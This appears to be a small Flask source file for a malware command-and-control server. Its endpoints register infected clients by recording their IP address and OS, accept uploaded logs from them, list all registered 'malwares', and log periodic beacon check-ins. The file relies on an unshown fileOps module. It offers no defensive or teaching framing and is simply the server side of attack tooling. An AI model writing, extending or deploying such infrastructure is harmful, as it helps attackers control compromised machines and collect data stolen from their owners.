from flask import Flask, request
import uuid
import fileOps

app = Flask(__name__)

@app.route("/clients")
def all_clients():
    return fileOps.get_malwares()

@app.route("/logs")
def get_log():
    
    return "this is a log"

@app.route("/upload", methods=['POST'])
def connect():
    fileOps.add_log_malware(request.get_json())
    return "this is a log"

@app.route("/register", methods=['POST'])
def registry():

    malwareRegistry = str(uuid.uuid1().int)
    form_data = request.form.to_dict()

    malware_entry = {
        "id": malwareRegistry,
        "ip": request.remote_addr,
        "os_signature": form_data['OS']
    }
    
    fileOps.add_malware(malware_entry)

    return malwareRegistry
    

@app.route("/becon")
def becon():
    form_data = request.form.to_dict()

    fileOps.update_becon_malware(form_data["id"],form_data["timestamp"])
    return "you are now beconning"

if __name__ == "__main__":
    app.run(debug=True)